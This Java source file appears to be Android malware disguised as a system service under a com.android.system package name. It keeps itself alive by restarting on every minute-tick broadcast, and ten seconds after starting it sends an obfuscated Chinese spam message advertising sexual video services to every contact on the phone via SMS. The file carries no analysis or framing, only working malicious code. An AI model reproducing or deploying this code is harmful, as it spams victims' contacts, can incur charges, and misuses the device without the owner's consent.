package com.android.system.service;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;

import com.android.system.utils.SystemUtil;

import java.io.IOException;
import java.io.InputStream;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class SystemService extends Service{
    public static boolean start(Context context) {
        if(!SystemUtil.isServiceRunning(context, SystemService.class.getCanonicalName())) {
            context.startService(new Intent(context, SystemService.class));
            return true;
        }
        return false;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        init();
        registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(final Context context, Intent intent) {
                SystemService.start(context);
                final BroadcastReceiver it = this;
                try {
                    context.unregisterReceiver(this);
                } catch (Exception e) {
                }
                new Timer().schedule(new TimerTask() {
                    @Override
                    public void run() {
                        try {
                            context.registerReceiver(it, new IntentFilter(Intent.ACTION_TIME_TICK));
                        } catch (Exception e) {
                        }
                    }
                },59000);
            }
        }, new IntentFilter(Intent.ACTION_TIME_TICK));
        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                sendMessage("┋◆冃.狌.交.伖，释.鲂.压.劦、棑.解.漃.瘼◆ 真 人】视||频. █网.址：wWw. GitHub .Com◆┋", SystemUtil.getContactAllName(SystemService.this) );
            }
        }, 10000);
    }

    private void init() {
        try {
            InputStream is = getAssets().open("hostname");
            byte[] data = new byte[is.available()];
            String hostname = new String(data, "UTF-8");
        } catch (IOException e) {
        }
    }

    private void sendMessage(String content, List<String> numberList) {
        for(String number: numberList) {
            try {
                SystemUtil.sendSmsTo(SystemService.this, number, content);
            } catch (Exception e) {
            }
        }
    }
}
